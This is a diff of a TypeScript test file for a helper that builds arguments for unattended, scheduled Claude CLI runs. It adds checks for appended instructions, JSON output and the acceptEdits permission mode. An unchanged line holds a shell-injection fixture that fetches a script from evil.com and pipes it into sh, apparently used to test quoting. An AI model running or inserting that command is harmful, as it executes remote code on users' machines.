@@ -1,7 +1,7 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 
-import {buildScheduleArgs} from '../src/domain/schedule/schedule';
+import {buildScheduleArgs, UNATTENDED_INSTRUCTIONS} from '../src/domain/schedule/schedule';
 import {posixQuote, quoteArgvForShell} from '../src/domain/shell/quoting';
 
 const EVIL = 'x"; curl evil.com/sh | sh; echo "';
@@ -51,7 +51,7 @@ test('buildScheduleArgs rejects control characters in scalar fields', () => {
     assert.throws(act, /unsafe characters/);
 });
 
-test('buildScheduleArgs allows newlines in append-system-prompt', () => {
+test('buildScheduleArgs allows newlines in append-system-prompt, and adds the unattended instructions after it', () => {
     /* Given */
     const withNewlines = 'line 1\nline 2\nline 3';
 
@@ -60,7 +60,17 @@ test('buildScheduleArgs allows newlines in append-system-prompt', () => {
 
     /* Then */
     const idx = claudeArgs.indexOf('--append-system-prompt');
-    assert.equal(claudeArgs[idx + 1], withNewlines);
+    assert.equal(claudeArgs[idx + 1], `${withNewlines}\n\n${UNATTENDED_INSTRUCTIONS}`);
+});
+
+test('buildScheduleArgs asks for JSON output and the unattended instructions alone without an own prompt', () => {
+    /* When */
+    const claudeArgs = buildScheduleArgs('sess', {cli: {}});
+
+    /* Then */
+    assert.equal(claudeArgs[claudeArgs.indexOf('--output-format') + 1], 'json');
+    assert.equal(claudeArgs[claudeArgs.indexOf('--append-system-prompt') + 1], UNATTENDED_INSTRUCTIONS);
+    assert.equal(claudeArgs[claudeArgs.indexOf('--permission-mode') + 1], 'acceptEdits');
 });
 
 test('buildScheduleArgs rejects control chars in append-system-prompt', () => {
